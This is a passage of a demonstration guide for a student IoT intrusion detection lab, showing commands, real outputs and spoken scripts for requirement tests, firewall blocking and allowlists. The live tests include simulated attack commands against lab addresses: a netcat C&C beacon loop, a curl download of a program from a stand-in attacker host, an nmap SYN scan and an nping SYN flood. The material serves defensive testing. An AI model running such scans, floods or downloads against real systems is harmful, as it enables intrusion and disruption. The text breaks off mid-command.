> After this test: `.venv\Scripts\python.exe lab_virtual\lab.py reset`

---

#### [Test 2.4] C&C: Infected Camera Keeps Calling Its C&C Server (`nc`)

💡 **Objective:** Regular outbound tries from the camera to an outside C&C server (`10.10.10.50:6667`) are classed **CnC**, and the router blocks the **outside server** (`block_dst`), not the camera.

⚙️ **Under the hood:** In IoT-23, an infected device often tries its C&C server again and again while the server is down. Our camera does the same: `nc -z` tries to open TCP 6667 every 5 seconds, 18 times (about 90 s). Nothing listens on 6667, so each try is refused (`REJ`). The window features `pair_gap`, `pair_gap_change` (regular timing) and `pair_fail_1h` (failed tries to the same address) grow. After 3 CnC alerts in 60 s, the policy blocks the destination `10.10.10.50` for 30 minutes. The camera is on the camera LAN (`lab.local_networks`), so it is never the block target.

💻 **Command** (first run the clean-up in Section 1 step 3, so that **no** C&C server is listening):
```powershell
docker exec ids-lab-camera sh -c 'for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do nc -z -w 2 10.10.10.50 6667; echo try $i exit=$?; sleep 5; done'
```
- `docker exec ids-lab-camera sh -c '...'`: run a small shell loop inside the camera.
- `for i in 1 ... 18`: 18 tries.
- `nc -z -w 2 10.10.10.50 6667`: try to open TCP 6667 on the C&C address (`-z` = only test the connection; `-w 2` = wait at most 2 s).
- `echo try $i exit=$?`: print the try number and the result (`exit=1` = connection failed).
- `sleep 5`: wait 5 seconds between tries.
- ⚠️ In PowerShell 5.1, keep this command in **single quotes** and do **not** put double quotes inside it (PowerShell 5.1 breaks inner double quotes when it calls a program).

📋 **Real Output (13 Nov 2026):**
```text
try 1 exit=1
try 2 exit=1
...
try 18 exit=1
```

🕵️ **Zeek records** (`Get-Content lab_virtual\zeek_logs\conn.log | Select-String '"id.resp_p":6667' | Select-Object -Last 3`):
- Before the block: `"conn_state":"REJ","history":"Sr","orig_pkts":1,"resp_pkts":1` — the try reached the server address and was refused.
- After the block: `"conn_state":"S0","history":"S","orig_pkts":2,"resp_pkts":0` — the router now drops the camera's packets to `10.10.10.50`, so no answer comes back.
- On 13 Nov: 6 refused tries (about 25–30 s), then the block.

🚨 **Alert (real, 13 Nov 2026):**
```text
07:51:57 CnC 0.76 192.168.50.30 -> 10.10.10.50:6667  flows 16 | response blocked AUTO_CNC_DEST_BLOCK
```
- Three runs on 13 Nov: CnC 0.76, 0.74 and 0.68 — blocked every time.

🛡️ **Router:**
```powershell
docker exec ids-lab-router nft list set inet ids block_dst
```
```text
table inet ids {
	set block_dst {
		type ipv4_addr
		flags timeout
		elements = { 10.10.10.50 timeout 30m expires 28m19s240ms }
	}
}
```

📊 **Output Breakdown:**
- `10.10.10.50` is in `block_dst`: the outside C&C address is blocked for 30 minutes.
- `192.168.50.30` is not in any set: the camera keeps working and keeps streaming to the NVR.
- The same demo with the project's bot (`camera_sim.py bot`, see A_TO_Z 4.3.3) gave CnC 0.86–0.93 and a block after 21–24 s on 12–13 Nov.

> ❗ **Why not `nc -lp 6667` as a C&C server?** If a server answers, the camera's connections succeed. Short **successful** connections gave **no alert** on 13 Nov (18 tries, 0 alerts). The model learned from IoT-23, where C&C traffic usually starts with many failed tries. Also, a leftover `lab_server.py --role cnc` stops `nc -lp 6667` from opening the port.

> After this test: **wait 30 seconds**, then `.venv\Scripts\python.exe lab_virtual\lab.py reset` (the block also stops the next download test).
> - Why wait: Zeek writes the last refused tries a few seconds after the loop ends. An unblock clears the block but keeps the policy's count of recent alerts (by design: after an unblock, the next alert may block again, `tests/unit/test_auto_response.py`). If a late try arrives **after** the reset, the address is blocked again at once. This happened once on 13 Nov 2026 (reset 10 s after the loop). Check that `block_dst` is empty before Test 2.5.

---

#### [Test 2.5] Program Download: Camera Downloads a Linux Program (`curl`)

💡 **Objective:** The camera downloading a Linux program from outside raises a **Malware_Download** alert from the file-type rule (Table 10 row 5: alert and evidence only, no block).

⚙️ **Under the hood:** The attack web server offers `/bins/lab_test.x86`, a **harmless** copy of the Linux `true` program (43,432 bytes). Zeek's file analysis puts the file type `application/x-sharedlib` (a Linux ELF program) in `files.log`; `core_engine/file_check.py` reads it and raises the alert with reason `RULE_EXECUTABLE_DOWNLOAD`.

💻 **Command:**
```powershell
docker exec ids-lab-camera curl -s -o /tmp/downloaded_malware.x86 -w "downloaded %{size_download} bytes, HTTP %{http_code}" http://10.10.10.50/bins/lab_test.x86
```
- `-o /tmp/downloaded_malware.x86`: save the file in the camera.
- `-w "..."`: print the size and the HTTP status.

📋 **Real Output:**
```text
downloaded 43432 bytes, HTTP 200
```

🕵️ **Zeek `files.log`** (`Get-Content lab_virtual\zeek_logs\files.log | Select-String "x-sharedlib" | Select-Object -Last 1`):
```json
{"id.orig_h":"192.168.50.30","id.orig_p":55466,"id.resp_h":"10.10.10.50","id.resp_p":80,"source":"HTTP","mime_type":"application/x-sharedlib","seen_bytes":43432,"total_bytes":43432,"missing_bytes":0}
```
- `mime_type: application/x-sharedlib`: Zeek found a Linux program from the file's first bytes.
- `seen_bytes: 43432`, `missing_bytes: 0`: Zeek saw the whole file. (Before the snap-length fix of 13 Nov 2026, D-058, Zeek saw only 14,480–18,816 bytes of it.)

🚨 **Alert (real, 13 Nov 2026, 09:06 UTC):**
```text
09:06:51 Malware_Download 1.0 10.10.10.50 -> 192.168.50.30:55466 flows 1 | response none | model rule:files.log
```
- Evidence: `File-type check: 192.168.50.30 downloaded a program/script file (type application/x-sharedlib, ... over http) from 10.10.10.50.`
- `model rule:files.log` and confidence 1.0: this alert comes from the **rule**, not the Random Forest.

---

### 📊 Summary Table: The 5 Live Tests (13 Nov 2026)

| Test | Class | Tool & command | Zeek evidence | Alert (real) | Router action |
|---|---|---|---|---|---|
| 2.1 | Benign | `curl` admin → camera page | `SF`, `ShADadfF` | none | none |
| 2.2 | PortScan | `nmap -sS -p 23,80,554 192.168.50.0/24` | many `S0` / `REJ` | PortScan 0.49–0.88 | none (block needs ≥ 0.88 and 3 in 60 s) |
| 2.3 | DDoS_DoS | `nping --tcp -p 80 --flags syn --rate 1000 -c 5000` | thousands of half-open flows | DDoS_DoS 0.38–0.45 (once also CnC 0.63, issue 43) | `limit_src` (that once also `block_src`) |
| 2.4 | CnC | `nc -z` loop, every 5 s, port 6667 refused | `REJ` then `S0` | CnC 0.68–0.76 | `block_dst` 10.10.10.50, 30 min |
| 2.5 | Malware_Download | `curl` camera → `/bins/lab_test.x86` | `files.log` `application/x-sharedlib` | Malware_Download 1.0 (rule) | none (alert only, Table 10 row 5) |

#### 🗣️ Spoken Script:
> *"Sir, for FR-02 we used standard tools. Normal admin access with curl gave no alert. A subnet scan with nmap gave PortScan alerts, but no block, because a PortScan block needs 0.88 confidence three times in one minute. An nping SYN flood was found as DDoS and the router rate-limited the attacker. In one of our three runs the first flood flows were also predicted as C&C, so the attacker was blocked as well; this is our open issue 43. When the camera kept trying to reach a C&C server with netcat, the model found C&C and the router blocked the outside server in block_dst. The camera itself was never blocked. A program download was found by our file-type rule on Zeek's files.log, as alert only, as Table 10 asks. Every alert carries the class, the confidence and the model version v3.1.0."*

---

### FR-03: Database Storage for Benign, Attacks & Mitigations (Must / DB Test)

> **Proposal Requirement:** "Save benign traffic summaries, attacks and response actions."

#### 💡 Why: 
Alerts, benign summaries and firewall actions must stay in the database (MongoDB) for the dashboard, the history page, export and audit — not only in memory.

#### ⚙️ Under the hood:
1. Reads the login from `lab_virtual/keys/dashboard_login.txt`.
2. Logs in (`POST /api/auth/login`) and gets a JWT token.
3. Reads `GET /api/summary` (counts from the MongoDB collections) and `GET /api/blocklist?active_only=false` (all block and rate-limit records).

#### 💻 Command:
```powershell
.venv\Scripts\python.exe -c "
import urllib.request, json
with open('lab_virtual/keys/dashboard_login.txt') as f:
    u, p = f.read().strip().split()[:2]
req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
tok = json.loads(urllib.request.urlopen(req).read())['token']
H = {'Authorization':'Bearer '+tok}
s = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/summary', headers=H)).read())
m, sy = s['metrics'], s['system']
bl = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/blocklist?active_only=false', headers=H)).read())
print('=== FR-03 DATABASE STORAGE PROOF (MongoDB iot_ids_lab) ===')
print('Benign flows saved (last 24 h) :', m['benign_flows_24h'])
print('Attack flows saved (all time)  :', m['total_attack_flows'], 'in', m['total_incidents'], 'incidents')
print('Incidents by class             :', s['incidents_by_class'])
print('Response actions saved         :', bl['count'], 'block/rate-limit records (active and ended)')
print('Active blocks / rate-limits    :', m['active_blocks'], '/', m['active_rate_limits'])
print('Pipeline status / model        :', sy['pipeline_status'], '/', sy['model_version'])
"
```

#### 🔍 Line-by-Line Breakdown:
- `open('lab_virtual/keys/dashboard_login.txt')`: the file holds the user name and the password.
- `/api/auth/login`: returns a signed JWT token (valid 8 hours).
- `/api/summary`: the numbers are inside `metrics` and `system` (not at the top level).
- `/api/blocklist?active_only=false`: every block and rate-limit ever saved, including ended ones.
- All Python strings use **single quotes**, because the whole program is inside PowerShell double quotes.

#### 📋 Real Output (13 Nov 2026):
```text
=== FR-03 DATABASE STORAGE PROOF (MongoDB iot_ids_lab) ===
Benign flows saved (last 24 h) : 7485
Attack flows saved (all time)  : 20677 in 101 incidents
Incidents by class             : {'CnC': 56, 'DDoS_DoS': 24, 'Malware_Download': 7, 'PortScan': 14}
Response actions saved         : 21 block/rate-limit records (active and ended)
Active blocks / rate-limits    : 0 / 0
Pipeline status / model        : running / v3.1.0
```

#### 📊 Output Breakdown:
- `Benign flows saved (last 24 h)`: benign flows go only to `traffic_summaries` (per-minute counts), never to `attack_events`.
- `Attack flows ... in 101 incidents`: many flows of one attack burst are joined into one incident (for example 446 flood flows → 1 event).
- `Incidents by class`: saved incidents from all lab tests so far.
- `Response actions saved`: the history of blocks and rate-limits stays after a rule ends (status `expired` or `removed`).
- The separate `response_actions` collection also keeps each action (`block`, `rate_limit`, `unblock`, `expire`, `isolate`). Before 13 Nov 2026 the automatic `rate_limit` and the `expire` records were refused by a spelling check; fixed in D-058.

##### 🔬 What It Proves:
All three kinds of data (benign summaries, attacks, response actions) are stored. MongoDB TTL indexes delete old data automatically (lab settings: attack events 90 days, traffic summaries 30 days, system logs 90 days; `docs/ethics/data_retention_plan.md`).

#### 🖥️ Dashboard:
- **Attack History (`/history`):** saved events with class filter.
- **Overview:** the numbers come from the same database.

#### 🗣️ Spoken Script:
> *"Sir, for FR-03, MongoDB stores benign summaries, attack incidents and every response action. Today it holds about seven and a half thousand benign flows from the last 24 hours, about one hundred incidents, and the full block history. Old records are removed automatically by TTL indexes, as in our retention plan."*

---

### FR-04: Authenticated Dashboard & Real-Time WebSocket Push (Must / Socket.IO Test)

> **Proposal Requirement:** "Send new events and alerts to the dashboard, which needs a login, without pressing refresh."

#### 💡 Why:
1. **Login is required:** without a valid token, the API and the live Socket.IO connection are refused.
2. **No refresh:** the backend pushes new data (`new_event`, `event_update`, `blocklist_update`, `summary_update`, `device_update`, `settings_update`, `log_export`) to the browser over Socket.IO.

#### ⚙️ Under the hood:
1. Calls an API **without** a token → expects 401.
2. Logs in → gets the JWT.
3. Reads `GET /api/v1/pipeline/status`: the runner measures, for each flow, the time from **reading the Zeek line** to **the dashboard push** (median and 95th percentile over the last 5,000 flows).

#### 💻 Command:
```powershell
.venv\Scripts\python.exe -c "
import urllib.request, urllib.error, json
with open('lab_virtual/keys/dashboard_login.txt') as f:
    u, p = f.read().strip().split()[:2]
try:
    urllib.request.urlopen('http://127.0.0.1:5000/api/summary')
except urllib.error.HTTPError as e:
    print('Request WITHOUT login     :', e.code, 'refused')
req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
r = json.loads(urllib.request.urlopen(req).read())
print('Login                     :', r['status'], '- user', u)
st = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/v1/pipeline/status', headers={'Authorization':'Bearer '+r['token']})).read())
mt = st['metrics']
print('Zeek line -> dashboard    : median', mt['latency_ms_p50'], 'ms, 95%', mt['latency_ms_p95'], 'ms (last', mt['latency_samples'], 'flows)')
print('Proposal target           : median < 2000 ms, 95% < 5000 ms')
"
```

#### 📋 Real Output (13 Nov 2026):
```text
Request WITHOUT login     : 401 refused
Login                     : success - user labadmin
Zeek line -> dashboard    : median 152.13 ms, 95% 620.43 ms (last 5000 flows)
Proposal target           : median < 2000 ms, 95% < 5000 ms
```

#### 📊 Output Breakdown:
- `401 refused`: no token → no data.
- `median 152 ms, 95% 620 ms`: the system part (read → features → model → decision → database → push). It changes per run (113–180 ms median seen on 12–13 Nov; higher just after a start or a flood).
- **What it does not include:** the time Zeek waits before it writes a flow. Zeek writes a line only when the connection ends (or times out), so a long connection appears later. Step 37 reports this separately (see Target 3).

#### 🖥️ Dashboard:
1. Top bar: green dot and **SOCKET.IO LIVE**.
2. Keep **Live Alerts (`/alerts`)** open and run Test 2.2 or 2.4: the card appears without touching the browser.
3. **Overview** numbers update every few seconds (`summary_update`).

Automated proof: `tests/integration/test_live_dashboard.py` starts a real server and a logged-in Socket.IO client, and checks the pushes and that a client without a login is refused.

#### 🗣️ Spoken Script:
> *"Sir, for FR-04, every API call and the live socket need a JWT login; without it the server answers 401. Alerts are pushed to the browser by Socket.IO, so we never press refresh. The measured system time from reading a Zeek line to the dashboard push is now about 150 milliseconds median and about 620 milliseconds at the 95th percentile, well inside the 2 and 5 second targets."*

---

### FR-05: Controlled Nmap Asset Discovery (Should / Inventory Test)

> **Proposal Requirement:** "Find approved devices and services with controlled Nmap scans."

#### 💡 Why:
- The IDS must know which devices are on the camera LAN, which services they offer (HTTP 80, RTSP 554), and which ones look like cameras.
- Scans are **controlled**: only an admin can start one, and only on the approved subnet `192.168.50.0/24` (`lab.approved_scan_subnets`); any other subnet is refused with 403.
- Results are saved in MongoDB (`devices`, `scans`), so the network is not scanned again and again.

#### ⚙️ Under the hood:
1. `POST /api/scans` with `192.168.50.0/24` → the scan starts **in the background** and the API answers **202** at once.
2. The real Nmap runs in the scanner container (`docker exec ids-lab-scanner nmap ...`, from `settings.lab.yaml`), because Nmap on Windows cannot reach the Docker networks.
3. The result is parsed: MAC/vendor, open ports, services; a camera rule with several pieces of evidence sets `possible_camera`; the device role comes from fixed lab addresses (router, sensor, admin, NVR) or the camera rule.
4. Devices are saved and `device_update` is pushed to the dashboard.
5. The command below waits until the scan is `completed`, then lists the devices.

#### 💻 Command:
```powershell
.venv\Scripts\python.exe -c "
import urllib.request, json, time
with open('lab_virtual/keys/dashboard_login.txt') as f:
    u, p = f.read().strip().split()[:2]
req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
tok = json.loads(urllib.request.urlopen(req).read())['token']
H = {'Authorization':'Bearer '+tok, 'Content-Type':'application/json'}
r = urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/scans', data=json.dumps({'subnet':'192.168.50.0/24'}).encode(), headers=H))
scan = json.loads(r.read())['scan']
print('Scan started  :', r.getcode(), scan['subnet'], 'id', scan['scan_id'])
for i in range(40):
    time.sleep(3)
    sc = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/scans/' + scan['scan_id'], headers=H)).read())['scan']
    if sc.get('status') not in ('running', 'pending'):
        break
print('Scan finished :', sc.get('status'), 'after about', (i + 1) * 3, 's')
devs = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/devices', headers=H)).read())['devices']
for d in sorted(devs, key=lambda d: [int(x) for x in d['ip'].split('.')]):
    print('{:<15} {:<12} ports {:<12} possible camera: {}'.format(d['ip'], d.get('device_type'), str(d.get('open_ports')), d.get('possible_camera')))
"
```

#### 📋 Real Output (13 Nov 2026):
```text
Scan started  : 202 192.168.50.0/24 id dc65d947-4161-4804-b96a-3e668580da1e
Scan finished : completed after about 27 s
192.168.50.1    router       ports [22]         possible camera: False
192.168.50.5    ids_sensor   ports []           possible camera: False
192.168.50.10   workstation  ports []           possible camera: False
192.168.50.20   nvr          ports []           possible camera: False
192.168.50.30   ip_camera    ports [80, 554]    possible camera: True
192.168.50.254  iot_device   ports []           possible camera: False
```

#### 📊 Output Breakdown:
- `202`: the scan was accepted and runs in the background.
- `completed after about 27 s`: the real Nmap scan of the subnet finished.
- `192.168.50.30 ... [80, 554] ... True`: only the camera has the camera ports and is marked as a possible camera.
- `192.168.50.254`: Docker's own gateway address on the camera LAN (it is part of the virtual network, not a lab device).
- The role names (`router`, `ids_sensor`, `workstation`, `nvr`) come from the fixed lab addresses.

##### 🔬 What It Proves:
A real, admin-only scan limited to the approved subnet finds every device and the camera's services, and saves them. A request for another subnet is refused (403 `UNAUTHORIZED_SUBNET`; tested in `tests/integration/test_scanner_integration.py`).

> Note: in the virtual lab, Docker does not give real vendor MAC prefixes, so the vendor column is not meaningful here. **MARK CAMERA** confirms a device as a camera; it does **not** add it to the allowlist.

> Side effect seen on 13 Nov: during this scan, the scanner's own flows from `192.168.50.5` were predicted CnC (0.44) by the model. Because `.5` is on the allowlist, they were marked `allowlist_protected` and nothing was blocked. This is a real example of the allowlist doing its job (RQ5).

#### 🖥️ Dashboard:
**Devices & Scans (`/devices`):** press **TRIGGER NMAP**, wait about 30 s, and show the camera row with ports 80 and 554 and the camera heuristic.

#### 🗣️ Spoken Script:
> *"Sir, for FR-05, only an admin can start a scan, and only on our approved subnet 192.168.50.0/24. The real Nmap runs from the sensor's management address. In about 27 seconds it found all six addresses, and only the camera at .30, with ports 80 and 554, was marked as a possible camera. The inventory is saved in MongoDB and pushed to the dashboard."*

---

### FR-06: Router Firewall Rules, Expiry & Timers (Must / Firewall Test)

> **Proposal Requirement:** "Add, list, expire and remove blocking rules on the firewall or router."

#### 💡 Why:
Blocks must be added, listed and removed on the real router, and must end by themselves after a fixed time.

#### ⚙️ Under the hood:
1. The router adapter (`core_engine/firewall/router_adapter.py`) runs `nft add element inet ids block_dst { IP timeout 30m }` over SSH (key login, the lab's own `known_hosts`).
2. The Linux kernel counts down the timer and deletes the element at zero (`flags timeout`).
3. The IDS also keeps the rule in MongoDB; the **rule expiry worker** (every 10 s) marks ended rules as `expired`.
4. **Add** happens in Test 2.4 (automatic) and Target 6 (manual). **Remove** happens in Target 6 (UNBLOCK).

#### 💻 Command (right after Test 2.4):
```powershell
docker exec ids-lab-router nft list set inet ids block_dst
```

#### 📋 Real Output (13 Nov 2026, after Test 2.4):
```text
table inet ids {
	set block_dst {
		type ipv4_addr
		flags timeout
		elements = { 10.10.10.50 timeout 30m expires 28m19s240ms }
	}
}
```

#### 📊 Output Breakdown:
- `10.10.10.50`: the outside C&C address is blocked as a **destination**.
- `timeout 30m expires 28m19s`: the kernel will delete the rule by itself; run the command again and the time is lower.
- The camera `192.168.50.30` is not in the set: only the outside server is blocked.

##### 🔬 Automatic expiry (already measured):
The Step 36 FR test (`reports/fr_tests/fr_tests_virtual_20261111_050418.md`) added a short rule, listed it on the router, removed one, and waited: "after 85 s: statuses ['expired', 'removed', 'expired', 'removed'], gone from firewall True". To repeat it: `.venv\Scripts\python.exe tools\fr_tests.py --help`.

#### 🖥️ Dashboard:
**Blocklist (`/mitigations`):** the rule shows the IP, action, direction, reason (`AUTO_CNC_DEST_BLOCK`) and **EXPIRES AT** (the clock time when it ends). The **UNBLOCK** button removes it at once.

#### 🗣️ Spoken Script:
> *"Sir, for FR-06, the IDS changes the real nftables table in the router over SSH. After the C&C test, the outside address 10.10.10.50 is in block_dst with a 30 minute timer that the Linux kernel counts down by itself. Our Step 36 test also showed rules expiring and being removed, both in the router and in the database."*

---

### FR-07: Allowlists, Thresholds & Audit Trail (Must / Safety Test)

> **Proposal Requirement:** "Keep the allowlists, the confidence thresholds and a full audit history."

#### 💡 Why:
The biggest danger of automatic response is blocking our own important devices. So: a fixed allowlist, clear thresholds, and a record of every action.

#### ⚙️ Under the hood:
1. Tries to block the NVR (`192.168.50.20`) → the API must refuse with 403.
2. Reads the settings the running policy uses now (`GET /api/settings`).
3. Reads the newest audit records (`GET /api/logs`, admin only).

#### 💻 Command:
```powershell
.venv\Scripts\python.exe -c "
import urllib.request, urllib.error, json
with open('lab_virtual/keys/dashboard_login.txt') as f:
    u, p = f.read().strip().split()[:2]
req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
tok = json.loads(urllib.request.urlopen(req).read())['token']
H = {'Authorization':'Bearer '+tok, 'Content-Type':'application/json'}
try:
    urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/blocklist', data=json.dumps({'ip':'192.168.50.20','reason':'safety test'}).encode(), headers=H))
except urllib.error.HTTPError as e:
    print('Try to block the NVR      :', e.code, json.loads(e.read())['code'])
s = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/settings', headers=H)).read())['settings']
print('Allowlist (never blocked) :', s['allowlist'])
print('Block thresholds          :', s['block_thresholds'], '| DDoS rate-limit:', s['rate_limit_thresholds'])
print('Repeat rule / max rule    :', s['min_repeats'], 'alerts in', s['repeat_window_seconds'], 's /', s['max_rule_minutes'], 'min')
print('Automatic response        :', 'ON' if s['auto_response'] else 'OFF')
logs = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/logs?limit=5', headers=H)).read())['logs']
print('Latest audit records:')
for l in logs:
    print('  {} {:<10} {:<22} {}'.format(l['timestamp'][:19], l['actor'], l['event'], l['outcome']))
"
```

#### 📋 Real Output (13 Nov 2026):
```text
Try to block the NVR      : 403 ALLOWLIST_PROTECTED
Allowlist (never blocked) : ['192.168.50.1', '192.168.50.10', '192.168.50.20', '192.168.50.5']
Block thresholds          : {'CnC': 0.3, 'Malware_Download': None, 'PortScan': 0.88} | DDoS rate-limit: {'DDoS_DoS': 0.3}
Repeat rule / max rule    : 3 alerts in 60 s / 30 min
Automatic response        : ON
Latest audit records:
  2026-11-13T07:55:43 labadmin   AUTH_LOGIN_SUCCESS     SUCCESS
  2026-11-13T07:55:32 labadmin   SCAN_COMPLETED         success
  2026-11-13T07:55:06 labadmin   SCAN_STARTED           success
  2026-11-13T07:55:05 labadmin   AUTH_LOGIN_SUCCESS     SUCCESS
  2026-11-13T07:54:55 labadmin   AUTH_LOGIN_SUCCESS     SUCCESS
```

#### 📊 Output Breakdown:
- `403 ALLOWLIST_PROTECTED`: the NVR cannot be blocked, not even by an admin.
- `Block thresholds`: chosen in Step 17 from grouped out-of-fold **training** data only (not from the test scenario). `None` for Malware_Download = alert only. There is **no single "P ≥ 0.85" gate**.
- `3 alerts in 60 s / 30 min`: the repeat rule and the longest rule time.
- `Automatic response: ON`: ON only in the virtual lab settings; the default in the code is OFF (proposal Table 11).
- Audit records: logins, scans, manual blocks/unblocks, rule expiry, setting changes, incident confirmation, exports, startup recovery.

##### 🔬 Safety layers (RQ5):
1. **Allowlist** (`.1`, `.5`, `.10`, `.20`): never blocked, not even by hand.
2. **Camera LAN protection** (`lab.local_networks` = `192.168.50.0/24`): no camera-LAN device is blocked **automatically**; for C&C the outside address is blocked instead.
3. **Repeat rule:** one alert never blocks.
4. **Rule time limit:** at most 30 minutes; the kernel removes it.
5. **Audit log** for every action.

> ⚠️ **Known gap (open issue 52):** a **manual** block of the camera `192.168.50.30` is accepted today, because the camera is not on the allowlist. **Do not block the camera in the demo.**

#### 🖥️ Dashboard:
**Settings (`/settings`):** minimum-confidence slider (30%), repeats, window and rule time can be changed and saved (**SAVE OPERATIONAL SETTINGS**); each change is saved with its history and written to the audit log. Automatic response is shown as ON/OFF but can only be changed in the YAML settings file. **Logs & Export (`/export`)** shows the audit records.

#### 🗣️ Spoken Script:
> *"Sir, for FR-07 and RQ5: the router, sensor, admin PC and NVR are on a fixed allowlist; even an admin's request to block the NVR is refused with 403. The camera LAN is protected from automatic blocks, so for C&C the outside server is blocked, not the camera. A block needs the class threshold — 0.30 for C&C, 0.88 for port scans — and three alerts within 60 seconds, and ends after at most 30 minutes. Every action is in the audit log. One open point: a manual block of the camera is still accepted; we will decide with you how to handle it."*

---

### FR-08: Filtered Forensic Log Export (Should / Export Test)

> **Proposal Requirement:** "Export filtered attack logs for testing and reporting."

#### ⚙️ Under the hood:
`GET /api/logs/export?type=events&format=csv&class=CnC&limit=3` (admin only) reads `attack_events` with the filters, writes RFC 4180 CSV, sends it as a file, writes a `LOGS_EXPORTED` audit record and pushes a `log_export` event. Other filters: `start_time`, `end_time`, `ip`, `src_ip`, `dst_ip`, `status`, `response_status`, `severity`; other types: `system_logs`, `actions`; format `json`.

#### 💻 Command:
```powershell
.venv\Scripts\python.exe -c "
import urllib.request, json, csv, io
with open('lab_virtual/keys/dashboard_login.txt') as f:
    u, p = f.read().strip().split()[:2]
req = urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})
tok = json.loads(urllib.request.urlopen(req).read())['token']
r = urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/logs/export?type=events&format=csv&class=CnC&limit=3', headers={'Authorization':'Bearer '+tok}))
text = r.read().decode()
print('HTTP', r.getcode(), '|', r.headers['Content-Disposition'])
rows = list(csv.DictReader(io.StringIO(text)))
print('Columns (' + str(len(rows[0])) + '):', ','.join(rows[0].keys()))
for x in rows:
    print(x['timestamp'][:19], x['predicted_class'], x['confidence'][:6], x['src_ip'], '->', x['dst_ip'] + ':' + x['dst_port'], x['response_status'], x['model_version'])
"
```
- `csv.DictReader`: reads the CSV the server sent, to show that it is valid CSV.

#### 📋 Real Output (13 Nov 2026):
```text
HTTP 200 | attachment; filename=ids_attack_logs_20261113_075617.csv
Columns (20): event_id,timestamp,direction,src_ip,src_port,dst_ip,dst_port,proto,service,predicted_class,confidence,severity,status,response_status,is_allowlisted,reason_code,flow_count,evidence_note,model_version,pipeline_latency_ms
2026-11-13T07:55:15 CnC 0.4446 192.168.50.5 -> 192.168.50.254:8899 allowlist_protected v3.1.0
2026-11-13T07:55:15 CnC 0.4467 192.168.50.5 -> 192.168.50.20:8899 allowlist_protected v3.1.0
2026-11-13T07:55:15 CnC 0.4467 192.168.50.5 -> 192.168.50.10:8899 allowlist_protected v3.1.0
```

#### 📊 Output Breakdown:
- `attachment; filename=...csv`: the browser saves it as a file.
- `Columns (20)`: the event fields, including class, confidence, response status, reason code, evidence note and model version. (The 27 flow features are kept in the database event, but are not CSV columns.)
- The 3 rows are the newest CnC events: the FR-05 scanner flows from the allowlisted `.5`, marked `allowlist_protected`.
- Timestamps are UTC (in the full CSV they end with `Z`).

#### 🖥️ Dashboard:
**Logs & Export (`/export`):** choose the type, class and dates, then press **EXPORT RFC 4180 CSV** or **EXPORT STRUCTURED JSON**. The file is saved as `ids_export_<type>_<date>.csv` (or `.json`) and can be opened in Excel.

#### 🗣️ Spoken Script:
> *"Sir, for FR-08, an admin can export filtered incidents, audit logs or response actions as RFC 4180 CSV or JSON, by class, address, status and time. Every export is itself written in the audit log."*

---

# 3. Part 2: Proposal Table 9 Targets

Section 2 of [`docs/requirements_checklist.md`](docs/requirements_checklist.md):

| # | Table 9 target | What we have now (13 Nov 2026) | State |
| :---: | :--- | :--- | :--- |
| 1 | Macro-F1 ≥ 0.85 on the left-out scenario | **0.8595** over the classes present on 34-1; 0.6876 over 5 classes. 34-1 was seen before → not a clean test. | **Met on the H1 number, with a warning** |
| 2 | FPR ≤ 5% on local camera traffic; no blocks on management PC or NVR | No camera / NVR / admin block in any test; NVR recorded 58.6 MB every 5 minutes. **FPR on real camera traffic not measured.** | **Partly** |
| 3 | Median decision < 2 s; 95% < 5 s | Zeek line → dashboard: median 0.141 s, 95% 0.636 s (Step 37 virtual report); live 152 / 620 ms now | **Met in the virtual lab** |
| 4 | Keeps up with lab traffic; no important event lost | Model ~23,000 flows/s; lab peak 500 flows/s; every attack test raised alerts. Capture-loss numbers need care. | **Enough for the virtual lab** |
| 5 | All important recovery tests pass | Backend restart: the lost router rule came back. Router reboot / power loss not tested. | **Partly** |
| 6 | Admin can finish the tasks; every action traced | Manual block, unblock and audit shown. Formal task test (Step 39) not done. | **Partly** |

---

### Target 1: Classification Quality (Macro-F1 ≥ 0.85 on the Held-Out Scenario)

#### 💡 Why:
Proposal H1 part 1 and Table 9 need macro-F1 ≥ 0.85 on a scenario left out of training (no scenario leakage).

#### ⚙️ Under the hood:
Reads the numbers that Step 16/17 saved in the model bundle `ml_engine/models/ids_bundle_v3.joblib` (they were computed on `CTU-IoT-Malware-Capture-34-1`, 23,145 flows).

#### 💻 Command:
```powershell
.venv\Scripts\python.exe -c "
import joblib
m = joblib.load('ml_engine/models/ids_bundle_v3.joblib')['metadata']
print('=== TABLE 9 CLASSIFICATION TARGET (saved in the model bundle) ===')
print('Model                     :', m['bundle_name'], m['bundle_version'])
print('Held-out scenario         :', m['level_2_heldout_scenario'], '({:,} flows)'.format(m['level_2_heldout_flows']))
print('Macro-F1, classes present :', '{:.2f}%'.format(m['level_2_macro_f1_present'] * 100), '(target >= 85%)')
print('Macro-F1, all 5 classes   :', '{:.2f}%'.format(m['level_2_macro_f1_5class'] * 100), '(34-1 has no Malware_Download flows)')
print('Accuracy / weighted F1    :', '{:.2f}% / {:.2f}%'.format(m['level_2_accuracy'] * 100, m['level_2_weighted_f1'] * 100))
print('Grouped CV out-of-fold F1 :', '{:.2f}%'.format(m['level_1_oof_macro_f1'] * 100), '(22 training scenarios)')
